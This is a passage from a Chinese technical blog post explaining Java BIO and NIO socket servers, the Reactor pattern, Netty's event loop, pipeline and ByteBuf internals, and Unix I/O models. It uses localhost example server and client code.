隐藏了下层具体实现的复杂性，并给上层提供了简单或统一的 API。下图是 TCP Socket 基本流程，使用 伯克利 Sockets 描述。\nUnix 的主题是“一切都是文件”。当进程申请访问 Socket 时，内核则提供相应的文件描述符（int 变量），进程发起系统调用并传递相应的文件描述符来读写 Socket。\nJava 网络编程 BIO Java 的 BIO 是指 blocking I/O，通常指 java.io 包组合 java.net 包。\n模型 上图来自服务化基石之远程通信系列三：I/O模型。基于 Java BIO 的服务器端程序，通常一个客户端（Client）向服务器端（Server）发起的请求由一个线程处理，回想前文的 TCP Socket 基本流程图，那么线程与 Socket 的关系如下：\n处理请求，通常都可以分解为：\n 读取请求（receive/read） 解码请求（deocode） 计算/处理（compute/process） 编码响应（encode） 发送响应（send/wirte）  其中 1 和 5 必定是 I/O 操作，回想前文所说的 I/O 操作的本质，即字节序列的来向和去向，来向与去向在 java.io 中的常见类型是 InputStream 和 OutputStream，I/O Stream 表示输入源或输出目的地。\n基于 Java BIO 的服务器端程序之所以使用线程池（ThreadPool），理由请参考多线程·并发编程 # Java 多线程 # 线程池。\nServer 以上内容结合 java.net 的 Socket API，足以编写典型的 Java BIO 服务器端程序：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  class Server implements Runnable { final int port; final Executor executor; final Processable processable; public Server(int port, Executor executor, Processable processable) { this.port = port; this.executor = executor; this.processable = processable; } @Override public void run() { try { ServerSocket serverSocket = new ServerSocket(port); while (!Thread.interrupted()) { Socket socket = serverSocket.accept(); executor.execute(new Handler(socket, processable)); } } catch (IOException e) { e.printStackTrace(); } } static class Handler implements Runnable { final Socket socket; final Processable processable; public Handler(Socket socket, Processable processable) { this.socket = socket; this.processable = processable; } @Override public void run() { processable.process(socket); } } @Deprecated interface Processable { void process(Socket socket); } }   注意 Server 的 run 方法，为什么使用 ServerSocket 循环？首先 accept() 是阻塞方法，表现为一个线程调用该方法时被阻塞在该方法，直到 ServerSocket 准备好接受（accpet）客户端发起的连接（connect）时方法返回，该线程退出该方法，返回值的类型是 Socket，表示客户端的 Socket 副本。然后，该线程命令工作线程处理 Socket，这里用 Handler 的 run 方法作为工作线程的任务，根据 Executor 的一般实现，execute() 非阻塞，立即返回。最后，继续循环。因此，如果没有工作线程且只有一个线程，容易出现该线程正在处理一个 Socket 而无法脱身去处理其它客户端的请求（供不应求）。\n建议使用日志框架代替 e.printStackTrace() 和 System.out.print*，还有合理设置线程池的参数，仅仅为了方便展示，采用以下方式启动 Server：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  public static void main(String[] args) { int port = args.length == 0 ? 8080 : Integer.parseInt(args[0]); Server server = new Server(port, Executors.newCachedThreadPool(), (socket) -\u0026gt; { try (InputStream input = socket.getInputStream(); OutputStream output = socket.getOutputStream()) { // read  int len; byte[] buf = new byte[1024]; if ((len = input.read(buf)) != -1) { String msg = new String(buf, 0, len); System.out.printf(\u0026#34;%s receive \u0026#39;%s\u0026#39; from %s\\n\u0026#34;, Thread.currentThread().getName(), msg, socket.toString()); // consuming  Thread.sleep(DELAY_TIME); // write  msg = String.format(\u0026#34;i am %s\u0026#34;, Thread.currentThread().getName()); output.write(msg.getBytes()); output.flush(); } } catch (IOException | InterruptedException e) { e.printStackTrace(); } }); new Thread(server).start(); System.out.printf(\u0026#34;server running on %s\\n\u0026#34;, port); }   处理 Socket 的过程首先是使用 Socket 得到 InputStream 和 OutputStream，然后从中读取字节数组，解码为字符串，打印表示收到了客户端发送的数据，最后以“自我介绍”回复客户端。注意，调用 read 方法将阻塞，直到输入数据可用或检测到 EOF 或引发异常为止。\n多客户端可以用多线程模拟。客户端先向服务器端发送“自我介绍”，然后尝试读取来自服务器端的消息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  public class BioClient { public static int NUMBER_OF_CLIENTS = 8; public static void main(String[] args) { String host = args.length == 0 ? \u0026#34;127.0.0.1\u0026#34; : args[0]; int port = args.length == 0 ? 8080 : Integer.parseInt(args[1]); Runnable runnable = () -\u0026gt; { try { Socket socket = new Socket(host, port); try (OutputStream output = socket.getOutputStream(); InputStream input = socket.getInputStream()) { // write  String msg = String.format(\u0026#34;i am %s\u0026#34;, Thread.currentThread().getName()); output.write(msg.getBytes()); output.flush(); // read  int len; byte[] buf = new byte[1024]; if ((len = input.read(buf)) != -1) { msg = new String(buf, 0, len); System.out.printf(\u0026#34;%s receive \u0026#39;%s\u0026#39; from %s\\n\u0026#34;, Thread.currentThread().getName(), msg, socket.toString()); } } } catch (IOException e) { e.printStackTrace(); } }; for (int i = 0; i \u0026lt; NUMBER_OF_CLIENTS; i++) { new Thread(runnable).start(); } } }   基于 Java NIO 的服务器端程序，虽然使用了线程池，但是处理 Socket 普遍存在阻塞 I/O，工作线程被阻塞或被迫等待较长时间，且一个 Socket 由一个线程处理，即线程工时利用率较低，单个这种服务器端程序应对负载增加（C10K ~ C100K）的能力并不是最优化。\nNIO Java 的 NIO 是指 non-blocking I/O 或 New I/O，通常指 java.nio 包组合 java.net 包。\n模型 上图来自服务化基石之远程通信系列三：I/O模型。Java NIO 致力于用比 Java BIO 更少的线程处理更多的连接。比如，一个不希望被老板开除的店小二将一位客人的订单交给后厨后，不会只等待后厨做好相应的菜然后上菜，而是立即去接待其它客人入座、点餐、结账等，若店小二观察到后厨做菜完成后则上菜或者后厨做菜完成后通知店小二上菜。\nJava NIO 有三大核心组件：\n  Channels。支持非阻塞读写 Channel 关联的文件或 Socket。\n  Buffers。可以从 Channel 直接读取或直接写入 Channel 的类似数组的对象。\n  Selectors。判断一组 Channel 中哪些发生了用户感兴趣的 I/O 事件。\n  一些不容忽视：\n  SelectionKeys。维护 I/O 事件状态和附件。\n  ServerSocketChannel。代替 ServerSocket。\n  SocketChannel。代替 Socket。\n  Channel\u0026amp;Selector Selector 是线程和 Channel 的中间层，多个连接可由一个线程处理。\nSelectionKey 定义了四种 I/O 事件： OP_READ、OP_WRITE、OP_CONNECT、OP_ACCEPT，均符合伯克利 Sockets 的语义，OP_CONNECT 为客户端专有，OP_ACCEPT 为服务器端专有。\n  OP_ACCEPT。ServerSocketChannel 接受就绪。\n  OP_READ。例如，SocketChannel 读就绪。\n  OP_WRITE。例如，SocketChannel 写就绪。\n  Buffer Buffer 维护了 position、limit、capacity 变量，具有写模式和读模式。\n  写模式。position 为 0，limit 等于 capacity，每插入一个元素，position 增加 1。\n  读模式。由读模式转换为写模式时，limit 设为 position，position 归零。\n  ByteBuffer 的写入和读取通常经历如下步骤：\n  将字节数组写入 ByteBuffer。\n  调用 flip()，转换为读模式。\n  从 ByteBuffer 读取字节数组。\n  调用 clear() 或 compact() 清空 ByteBuffer。\n  Channel 已提供直接从中读取 ByteBuffer 或直接写入其中的方法。\n值得一提的是，ByteBuffer 支持分配直接字节缓冲区，即堆外内存。\n1 2 3  public static ByteBuffer allocateDirect(int capacity) { return new DirectByteBuffer(capacity); }   1 2 3 4 5  public static ByteBuffer allocate(int capacity) { if (capacity \u0026lt; 0) throw new IllegalArgumentException(); return new HeapByteBuffer(capacity, capacity); }   DirectByteBuffer 通常比 HeapByteBuffer 内存复制次数更少。以写 Socket 为例，JVM 先从堆中复制数据到进程缓冲区，操作系统内核再从进程缓冲区复制数据到内核缓冲区，然后从内核缓冲区复制数据到 I/O 设备。如果分配直接缓冲区，那么就减去了从堆复制数据到进程缓冲区的操作。allocateDirect 方法使用了 sun.misc.Unsafe#allocateMemory 方法，这种方法返回的缓冲区通常比非直接缓冲区具有更高的分配和释放成本，因为堆外内存在 GC 范围之外，即使 java.nio.DirectByteBuffer 实现了自己的缓冲区对象管理，仍然有堆外内存泄露的风险，通常要考虑以下的 JVM 选项：\n1  -XX:MaxDirectMemorySize=size   一个直接字节缓冲区也可以通过将文件区域直接 mapping 到内存中来创建，原理是 mmap。\nReactor 根据上文的知识，足以实现典型的 Java NIO 服务器端程序，但是我把它删掉了；因为它表现得不如上文典型的 Java BIO 的服务器端程序，更因为我读到了 Doug Lea 讲的 Reactor 模式（链接在文章末尾），常翻 JDK 源码可以发现他是大部分并发数据结构的作者。\n单线程版 若用 Java 语言来描述上图，基本的 Reactor 模式如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110  class Reactor implements Runnable { final Selector selector; final ServerSocketChannel serverSocketChannel; final ChannelHandler channelHandler; public Reactor(int port, ChannelHandler channelHandler) throws IOException { selector = Selector.open(); serverSocketChannel = ServerSocketChannel.open(); serverSocketChannel.socket().bind(new InetSocketAddress(port)); serverSocketChannel.configureBlocking(false); SelectionKey selectionKey = serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); selectionKey.attach(new Acceptor()); // (1)  this.channelHandler = channelHandler; } @Override public void run() { try { while (!Thread.interrupted()) { selector.select(); Set\u0026lt;SelectionKey\u0026gt; selectionKeys = selector.selectedKeys(); Iterator\u0026lt;SelectionKey\u0026gt; iterator = selectionKeys.iterator(); while (iterator.hasNext()) { SelectionKey selectionKey = iterator.next(); dispatch(selectionKey); // (2)  iterator.remove(); } selectionKeys.clear(); } } catch (IOException e) { e.printStackTrace(); } } private void dispatch(SelectionKey selectionKey) { Runnable runnable = (Runnable) selectionKey.attachment(); if (runnable != null) { runnable.run(); // (3)  } } class Acceptor implements Runnable { @Override public void run() { try { SocketChannel socketChannel = serverSocketChannel.accept(); if (socketChannel != null) { new Handler(selector, socketChannel, channelHandler); // (4)  } } catch (IOException e) { e.printStackTrace(); } } } static class Handler implements Runnable { final SelectionKey selectionKey; final SocketChannel socketChannel; final ChannelHandler channelHandler; ByteBuffer inputBuf = ByteBuffer.allocate(1024); ByteBuffer outputBuf = ByteBuffer.allocate(1024); static int READING = 0, WRITING = 1; int state = READING; public Handler(Selector selector, SocketChannel socketChannel, ChannelHandler channelHandler) throws IOException { this.socketChannel = socketChannel; this.socketChannel.configureBlocking(false); // (5)  selectionKey = this.socketChannel.register(selector, 0); selectionKey.attach(this); selectionKey.interestOps(SelectionKey.OP_READ); selector.wakeup(); this.channelHandler = channelHandler; } @Override public void run() { try { if (state == READING) { read(); } else if (state == WRITING) { write(); } } catch (Exception e) { e.printStackTrace(); } } private void read() throws IOException { channelHandler.read(socketChannel, inputBuf); if (channelHandler.inputCompleted(inputBuf)) { channelHandler.process(inputBuf, outputBuf); state = WRITING; selectionKey.interestOps(SelectionKey.OP_WRITE); } } private void write() throws IOException { channelHandler.write(socketChannel, outputBuf); if (channelHandler.outputCompleted(outputBuf)) { selectionKey.cancel(); // (6)  } } } }   （1）Reactor 构造器。使用 serverSocketChannel 注册 selector 并添加感兴趣的 I/O 事件（OP_ACCEPT）之后，返回得到一个 selectionKey，selectionKey 可添加一个附件，这个附件是 Acceptor 对象的引用。\n（2）分派循环。首先，调用 selector.select() 时阻塞，直到选中了一组已准备好进行 I/O 操作的 Channel 所对应的键（SelectionKey），初始只对 OP_ACCEPT 感兴趣。然后，迭代得到相应的键，因为一开始只有一个 Channel，所以当前键集合大小为 1，调用 dispatch 时得到的键的附件即是 Acceptor 对象的引用。\n（3）分派方法。由（2）可知，Acceptor 的 run 方法被调用，但不直接启动新线程。\n（4）Acceptor 运行方法。传递 selector 和 socketChannel 来新建 Handler 对象，不直接调用其 run 方法，而是返回到分派循环。\n（5）Handler 构造器。用当前的 socketChannel 注册 selector 并添加感兴趣的 I/O 事件（OP_READ）和附件（Handler 对象的引用），但要注意唤醒 selector，使尚未返回的第一个 select 操作立即返回，理由是有新的 Channel 加入。\n（6）Handler 运行方法。在分派循环中，若可读的 socketChannel 对应的键被选中，则该键的附件，即 Handler 对象的 run 方法被调用，对 Channel 进行非阻塞读写操作，中间还有 process 方法（业务逻辑），写完之后取消该键关联的 socketChannel 对 selector 的注册。\n在 Java NIO 中，对 Channel 的读写是非阻塞方法（直接执行且立即返回，但稍后再执行），通常要判断输入是否完成（inputCompleted），完成后进行业务逻辑处理（process），以及判断输出是否完成（outputCompleted），完成后注销（短连接）。\n1 2 3 4 5 6 7 8 9 10 11 12 13  public interface ChannelHandler { void read(SocketChannel socketChannel, ByteBuffer inputBuf) throws IOException; boolean inputCompleted(ByteBuffer inputBuf); void process(ByteBuffer inputBuf, ByteBuffer outputBuf); void write(SocketChannel socketChannel, ByteBuffer outputBuf) throws IOException; boolean outputCompleted(ByteBuffer outputBuf); }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  public class DefaultChannelHandler implements ChannelHandler { public static final String SEND = \u0026#34;i am %s\u0026#34;; public static final String RECEIVE = \u0026#34;%s receive \u0026#39;%s\u0026#39;\u0026#34;; @Override public void read(SocketChannel socketChannel, ByteBuffer inputBuf) throws IOException { socketChannel.read(inputBuf); } @Override public boolean inputCompleted(ByteBuffer inputBuf) { return inputBuf.position() \u0026gt; 2; } @Override public void process(ByteBuffer inputBuf, ByteBuffer outputBuf) { try { inputBuf.flip(); String msg = Charset.defaultCharset().newDecoder().decode(inputBuf).toString(); System.out.printf(RECEIVE + \u0026#34;\\n\u0026#34;, Thread.currentThread().getName(), msg); // consuming  Thread.sleep(BioServer.DELAY_TIME); msg = String.format(SEND, Thread.currentThread().getName()); outputBuf.put(ByteBuffer.wrap(msg.getBytes())); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } @Override public void write(SocketChannel socketChannel, ByteBuffer outputBuf) throws IOException { outputBuf.flip(); socketChannel.write(outputBuf); } @Override public boolean outputCompleted(ByteBuffer outputBuf) { return !outputBuf.hasRemaining(); } }   仅仅为了方便展示，采用以下方式启动 Reactor：\n1 2 3 4 5 6 7 8  public static void main(String[] args) throws IOException { int port = args.length == 0 ? 8080 : Integer.parseInt(args[0]); ExecutorService executorService = Executors.newSingleThreadExecutor(); executorService.execute(new Reactor(port, Executors.newCachedThreadPool(), new DefaultChannelHandler())); System.out.printf(\u0026#34;server running on %s\\n\u0026#34;, port); }   一图胜千言。\n与上文 BIO 客户端程序类似，也模拟多客户端。客户端先向服务器端发送“自我介绍”，然后尝试读取来自服务器端的消息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  public class Client { public static void main(String[] args) { String host = args.length == 0 ? \u0026#34;127.0.0.1\u0026#34; : args[0]; int port = args.length == 0 ? 8080 : Integer.parseInt(args[1]); SocketAddress socketAddress = new InetSocketAddress(host, port); Runnable runnable = () -\u0026gt; { try { SocketChannel socketChannel = SocketChannel.open(socketAddress); socketChannel.configureBlocking(true); // write  String msg = String.format(DefaultChannelHandler.SEND, Thread.currentThread().getName()); ByteBuffer buffer = ByteBuffer.wrap(msg.getBytes()); socketChannel.write(buffer); // read  buffer = ByteBuffer.allocate(1024); socketChannel.read(buffer); if (buffer.position() \u0026gt; 0) { buffer.flip(); msg = Charset.defaultCharset().newDecoder().decode(buffer).toString(); System.out.printf(DefaultChannelHandler.RECEIVE + \u0026#34;\\n\u0026#34;, Thread.currentThread().getName(), msg); } } catch (IOException e) { e.printStackTrace(); } }; for (int i = 0; i \u0026lt; BioClient.NUMBER_OF_CLIENTS; i++) { new Thread(runnable).start(); } } }   多线程版 仔细审视单线程版可以发现，accept、read、process、write 都只由一个线程执行，但是应对高并发时单线程工作能力有限。如果它读完了一个 Channel 后在 process 中执行耗时任务，那么就没有空闲时间进行其它 Channel 的 accept、read、write 操作；因此，使用 Boss/Reactor 线程执行非阻塞的 accept、read、write 操作，命令工作线程执行耗时的 process 操作，充分消费多处理器来提高程序性能。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  static class Handler implements Runnable { final Selector selector; final SelectionKey selectionKey; final SocketChannel socketChannel; final ChannelHandler channelHandler; ByteBuffer inputBuf = ByteBuffer.allocate(1024); ByteBuffer outputBuf = ByteBuffer.allocate(1024); static int READING = 0, PROCESSING = 1, WRITING = 2; int state = READING; final Executor executor; public Handler(Selector selector, SocketChannel socketChannel, Executor executor, ChannelHandler channelHandler) throws IOException { this.selector = selector; this.socketChannel = socketChannel; this.socketChannel.configureBlocking(false); selectionKey = this.socketChannel.register(selector, 0); selectionKey.attach(this); selectionKey.interestOps(SelectionKey.OP_READ); selector.wakeup(); this.executor = executor; this.channelHandler = channelHandler; } @Override public void run() { try { if (state == READING) { read(); } else if (state == PROCESSING) { processAndHandOff(); } else if (state == WRITING) { write(); } } catch (IOException e) { e.printStackTrace(); } } private synchronized void read() throws IOException { channelHandler.read(socketChannel, inputBuf); if (channelHandler.inputCompleted(inputBuf)) { state = PROCESSING; executor.execute(this::processAndHandOff); } } private synchronized void processAndHandOff() { channelHandler.process(inputBuf, outputBuf); state = WRITING; selectionKey.interestOps(SelectionKey.OP_WRITE); selector.wakeup(); } private void write() throws IOException { channelHandler.write(socketChannel, outputBuf); if (channelHandler.outputCompleted(outputBuf)) { selectionKey.cancel(); } } }   在单线程版的基础上修改 Handler，然后用以下方式启动 Reactor（建议合理设置线程池的参数）：\n1 2  ExecutorService executorService = Executors.newSingleThreadExecutor(); executorService.execute(new Reactor(port, Executors.newCachedThreadPool(), new DefaultChannelHandler()));   进一步扩展，甚至可以同时运行两个 Boss/Reactor 线程，主 Reactor 线程负责 accept，分派已接受的 Channel 给子 Reactor 线程 read 和 write，子 Reactor 线程命令工作线程 process。\n一般的开发人员直接使用 Java NIO 编写服务器端或客户端，既要保证可靠，又要保证高性能，实属不易，终于到了主角登场的时候。\nNetty Netty 是异步、事件驱动网络应用程序框架，用于快速开发可维护的高性能协议服务器端和客户端。\n如何使用 Netty，参考 Netty # Wiki、netty/netty/tree/4.1/example、normanmaurer/netty-in-action 。下文则更关注如何理解 Netty 4.x 的核心（Core）。\n Bootstrapor or ServerBootstrap EventLoop EventLoopGroup ChannelPipeline Channel Future or ChannelFuture ChannelInitializer ChannelHandler  事件模型 EventLoop EventLoop，即事件循环，一个 EventLoop 通常将处理多个 Channel 的事件，EventLoop 在它生命周期中只绑定单个线程，而 EventLoopGroup 包含一个或多个 EventLoop。\nEventLoop 类的族谱如下所示：\n由此可见，EventLoop 的本源是 Executor（请先阅读多线程·并发编程 # Java 多线程 # 线程池），那么 EventLoop 处理 Channel 的事件转换为执行（execute）相应的任务，\n任务的基本实现是 Runable，任务可能立即执行，也可能加入队列，取决于调用 execute 方法的线程是否是 EventLoop 绑定的线程。\n如下图所示，一个 NioEventLoopGroup 通常维护多个 NioEventLoop 。\n当一个 Channel 注册到一个 NioEventLoopGroup，根据上文所说的 Java NIO 知识，该 Channel 注册到一个由某个 NioEventLoop 维护的 Selector，因此，NioEventLoop 通常将处理多个 Channel 的事件。\nChannelPipeline 事件分为入站（inbound）事件和出站（outbound）事件。一个事件被 EventLoop 作为任务执行之前，它流经 ChannelPipeline 中已安装的一个或多个 ChannelHandler。\n每个 Channel 都有各自的 ChannelPipeline，新建 Channel 时自动创建，使用 ChannelPipeline 添加或删除 ChannelHandler 是线程安全的。ChannelPipeline 的子接口有 ChannelInboundHandler 和 ChannelOutboundHandler，分别用于 EventLoop 处理入站事件和出站事件。\nChannelPipeline 实现了 Intercepting Filter 模式的高级形式，所谓 Filter 模式，常常被认为属于责任链模式，比如 Servlet 的请求过滤器：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  public class CustomFilter implements Filter { public void doFilter( ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { // process the request  // pass the request (i.e. the command) along the filter chain  chain.doFilter(request, response); } }   一个 Filter 可以拦截请求，也可以转发请求给下一个 Filter。为了帮助理解，HandlerChain 演示了基于链表和多态的责任链模式。\n对于 DefaultChannelPipeline 来说，其链表通常有一个特别的头（HeadContext）和尾（TailContext），实际上结点是包装了 ChannelHandler 的 ChannelHandlerContext。ChannelHandlerContext 定义了事件传播方法（event propagation method），例如 ChannelHandlerContext.fireChannelRead(Object) 和 ChannelOutboundInvoker.write(Object)，事件在 ChannelPipeline 中流动。\n以 Channel 读就绪为例，它属于入站事件，输入的数据也在 ChannelPipeline 中流动。\n若以服务器端接受请求和发送响应为例，假设 RequestDecoder 和 BussinessHandler 都继承了 ChannelInboundHandlerAdapter，ResponseEncoder 继承了 ChannelOutboundHandlerAdapter。\n1 2 3 4  ChannelPipeline pipeline = channel.pipeline(); pipeline.addLast(new RequestDecoder()); pipeline.addLast(new ResponseEncoder()); pipeline.addLast(new BussinessHandler());   （1）接受请求。\n1  -\u0026gt; RequestDecoder（解码）-\u0026gt; ResponseEncoder（非触发）-\u0026gt; BussinessHandler（处理）-\u0026gt;   （2）业务逻辑。\n假设处理完成后调用 ChannelOutboundInvoker.writeAndFlush(Object) 来写回复消息。\n（3）发送响应。\n1  -\u0026gt; BussinessHandler（写消息）-\u0026gt; ResponseEncoder（编码）-\u0026gt; RequestDecoder（非触发）-\u0026gt;   最小化内存复制 Netty 使用它自己的 buffer API 代替 Java NIO 的 ByteBuffer 来表示字节序列。Netty 新的缓冲区类型，名为 ByteBuf，它具有如下特性：\n 您可以根据需要定义缓冲区类型。 透明的零复制是通过内置的聚合缓冲区类型实现的。 开箱即有，动态扩容。 不需要调用 flip() 了。 它通常比 ByteBuffer 快。  注意，上面的零复制并不是操作系统级零复制，操作系统级零复制是指 CPU 不执行将数据从一个存储区域复制到另一个存储区域的任务，详情见 zero-copy。如果 \u0008I/O 设备支持 DMA 的 scatter-gather 操作，那么 Java NIO 提供操作系统级零复制方法是 transferTo。\n聚合缓冲区类型是指 CompositeByteBuf。\n假设有两个字节数组，header 和 body，在模块化系统中，这两个字节数组可以由不同的模块生产，然后在消息发送后聚合。如果用 Java NIO 的 ByteBuffer 来聚合两个字节数组，一般人可能考虑新建一个缓冲区数组并持有两个字节数组，或者新建一个缓冲区并插入两个字节数组。\n1 2  // Use an array to composite them ByteBuffer[] message = new ByteBuffer[] { header, body };   1 2 3 4 5  // Use copy to merge both ByteBuffer message2 = ByteBuffer.allocate(header.remaining() + body.remaining()); message.put(header); message.put(body); message.flip();   以上两种方式不仅有内存复制的成本，而且第一种方式还引入了不兼容或复杂的缓冲区数组类型。\n1 2 3 4 5 6  // The composite type is incompatible with the component type. ByteBuf message = Unpooled.wrappedBuffer(header, body); // Therefore, you can even create a composite by mixing a composite and an // ordinary buffer. ByteBuf messageWithFooter = Unpooled.wrappedBuffer(message, footer);   如果使用 Netty 的 ByteBuf 实现，则内存复制次数几乎为零，因为缓冲区引用了两个或多个数组（指针）。\n1 2 3 4  CompositeByteBuf compBuf = Unpooled.compositeBuffer(); ByteBuf headerBuf = ...; // can be backing or direct ByteBuf bodyBuf = ...; // can be backing or direct compBuf.addComponent(headerBuf, bodyBuf);   同理，聚合两个缓冲区，使用指针而不是从原缓冲区复制。\n1 2  ByteBuf buf = Unpooled.copiedBuffer(\u0026#34;Hello, World!\u0026#34;, StandardCharsets.UTF_8); ByteBuf sliced = buf.slice(0, 14);   同理，缓冲区的切片，返回的切片引用了原缓冲区的子数组。\n为什么高性能 为什么 Netty 吞吐量更高、延迟更低、资源消耗更少？比如 RxNetty vs Tomcat 和 七种 WebSocket 框架的性能比较。\n  使用 Java NIO 和 Reactor 模式。为什么 Java NIO 高效，上文的解释是“以阻塞时间换工作时间”，下文将补充操作系统层解释；为什么说 Netty 使用了 Reactor 模式，这里提供一个线索，Netty 中的 ServerBootstrap 的 group 方法有两个类型均为 EventLoopGroup 的参数，回想一下上文“Reactor 多线程版” 最后一张图。\n  GC 优化。例如，使用缓冲区对象池，复用缓冲区对象减少了频繁新建对象和收集垃圾引起的延迟，且使用直接缓冲区，详情见 Netty 4 at Twitter: Reduced GC Overhead 和 PooledByteBufAllocator.java。\n  减少不必要的内存复制。如上文所说。\n  \u0026hellip;\u0026hellip;\n  应用程序优化 S0 优化业务逻辑。\nS1 避免阻塞 bossGroup/parentGroup 和 workerGroup/childGroup 中的线程。执行耗时任务（如访问数据库），考虑新建给定线程数的 EventLoopGroup 对象，添加它和业务逻辑的 ChannelHandler 到 ChannelPipeline。\nS2 复用 ByteBuf 对象，减少 GC 引起的延迟。\n ByteBuf is a reference-counted object which has to be released explicitly via the release() method. Please keep in mind that it is the handler\u0026rsquo;s responsibility to release any reference-counted object passed to the handler\n S2.1 使用 release()，回收对象后将隐式复用对象。\n1 2 3 4 5  @Override public void channelRead(ChannelHandlerContext ctx, Object msg) { // Do something with msg  ((ByteBuf) msg).release(); }   1 2 3 4 5 6 7 8  @Override public void channelRead(ChannelHandlerContext ctx, Object msg) { try { // Do something with msg  } finally { ReferenceCountUtil.release(msg); } }   1 2 3 4 5 6  @Override public void channelRead(ChannelHandlerContext ctx, Object msg) { // Do something with msg  ctx.write(msg); ctx.flush(); }    It is because Netty releases it for you when it is written out to the wire.\n S2.2 继承 SimpleChannelInboundHandler。\n Be aware that depending of the constructor parameters it will release all handled messages by passing them to ReferenceCountUtil.release(Object). In this case you may need to use ReferenceCountUtil.retain(Object) if you pass the object to the next handler in the ChannelPipeline.\n S2.3 使用事件传播方法，转发给其它结点释放。\nA1 ChannelOption 配置或参数调优，例如调整 TCP 发送/接收缓冲区（TCP Send/Receive Buffers）的大小：\n1 2 3 4 5 6 7  ServerBootstrap bootstrap = new ServerBootstrap() .channel(EpollServerSocketChannel.class) .group(bossGroup, workerGroup) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new CustomChannelInitializer()) .childOption(ChannelOption.SO_SNDBUF, 1024 * 1024) .childOption(ChannelOption.SO_RCVBUF, 32 * 1024);   A2 复用自定义的 ChannelHandler 对象。使用 @ChannelHandler.Sharable，但要注意是否存在多线程访问共享变量的安全问题。\nI/O 模型 经典的 《UNIX Network Programming》已经完美诠释了五种 I/O 模型。\n blocking I/O nonblocking I/O I/O multiplexing (select and poll and epoll) signal driven I/O (SIGIO) asynchronous I/O (the POSIX aio_ functions)  目前来说，signal driven I/O 和 asynchronous I/O 在 Linux 的应用较为罕见，因此本文只关注前三种。\n回想开头所说的 I/O 的本质，但别忘了操作系统是应用程序和硬件的中间层。\n  输入是从 I/O 设备复制字节序列到内核缓冲区，然后从内核缓冲区复制字节序列到进程缓冲区。\n  输出是从进程缓冲区复制字节序列到内核缓冲区，然后从内核缓冲区复制字节序列到 I/O 设备。\n  blocking I/O \u0026amp; nonblocking I/O 以读 Socket 为例，线程调用 recvfrom 函数并传递目标 Socket 文件描述符，该线程被阻塞在该函数，当目标 Socket 读就绪，内核复制数据报，复制完成后该函数返回 OK，该线程退出该函数并执行后续语句。\n仍以读 Socket 为例，线程调用 recvfrom 函数并传递目标 Socket 文件描述符，该线程没被阻塞在该函数，该函数返回错误码，表示目标 Socket 非读就绪，线程重复调用该函数（轮询），当目标 Socket 读就绪，该线程被阻塞在该函数，内核复制数据报，复制完成后该函数返回 OK，该线程退出该函数并执行后续语句。\n注意，blocking I/O 模型和 nonblocking I/O 模型都出现了线程被阻塞在函数的现象。\n最后以先读 Socket 后写 Socket 为例，下面这张来自 Shawn Xu 的文章（文末有链接）的图详细描述了 Java BIO 的底层行为。\n注意，JVM 发起 2 次系统调用，内核执行 2 次数据复制。\nI/O multiplexing 继续以读 Socket 为例，线程在调用 recvfrom 函数前，先调用 select 函数并传递目标 Socket 文件描述符列表，该线程被阻塞在 select 函数，直到一个或多个目标 Socket 读就绪，内核对列表中可读的 Socket 文件描述符做了标记，然后 select 函数返回，线程执行循环语句遍历这个列表，查找已标记的 Socket 文件描述符，每命中一个 Socket 文件描述符就调用 recvfrom 函数并传递 Socket 文件描述符，该线程被阻塞在 recvfrom 函数，当目标 Socket 读就绪，内核复制数据报，复制完成后该函数返回 OK，该线程退出该函数并继续执行循环语句。select 函数的实现细节有明显可优化的地方，比如，内核只需回复一个只存储就绪的 Socket 文件描述符列表，可节省顺序查找的开销。\n虽然以上三种 I/O 模型均出现了线程被阻塞在函数的现象，但是 I/O multiplexing 模型的优势在于单一线程在相同时间内能够处理更多的连接或请求，同时组合多线程模型，例如 Reactor 模式，所以才说，一个基于 I/O multiplexing 的 Java NIO 服务器端应对负载增加的能力通常高于一个 Java BIO 服务器端。\n原生传输 早在 JDK 6 就已经包括了基于 Linux epoll 全新的 SelectorProvider，当检测到内核 2.6 以及更高版本时，默认使用基于 epoll 的实现，当检测到 2.6 之前的内核版本时，将使用基于 poll 的实现。\nNetty 则提供了特别的 JNI 传输，与基于 NIO 的传输相比，产生更少的垃圾，通常可以提高性能。\n NioEventLoopGroup → EpollEventLoopGroup NioEventLoop → EpollEventLoop NioServerSocketChannel → EpollServerSocketChannel NioSocketChannel → EpollSocketChannel  详情请见 Netty # Native transports。\n文中代码 已发布，请移步 network。\n 本文首发于 https://h2cone.github.io\n 更多经验   Scalable IO in Java - Doug Lea\n  Java NIO trick and trap\n  It’s all about buffers: zero-copy, mmap and Java NIO\n  Build Your Own Netty — Reactor Pattern\n  Reactor pattern - Wikipedia\n  Event (computing) - Wikipedia\n  Netty in Action # Chapter 7. EventLoop and threading model\n  Netty in Action # Chapter 6. ChannelHandler and ChannelPipeline\n  Netty in Action # Chapter 5. ByteBuf\n  Chain-of-responsibility 